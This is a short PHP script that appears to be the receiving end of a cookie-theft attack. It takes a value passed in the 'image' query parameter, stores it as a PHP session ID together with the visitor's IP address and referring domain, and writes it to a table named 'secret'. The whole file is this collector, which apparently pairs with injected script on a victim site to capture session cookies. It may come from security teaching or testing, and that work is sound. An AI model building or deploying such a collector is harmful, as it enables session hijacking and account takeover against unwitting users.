<?php
	require('connect_db.php');
	$insert_sql = "INSERT INTO secret (phpsession, ip, domain) VALUES (:session, :ip, :domain);";
	$statement = $db->prepare($insert_sql);
	$statement->bindValue(":session", $_GET['image'], PDO::PARAM_STR);
	$statement->bindValue(":ip", $_SERVER['REMOTE_ADDR'], PDO::PARAM_STR);
	$statement->bindValue(":domain", $_SERVER['HTTP_REFERER'], PDO::PARAM_STR);
	$statement->execute();
?>
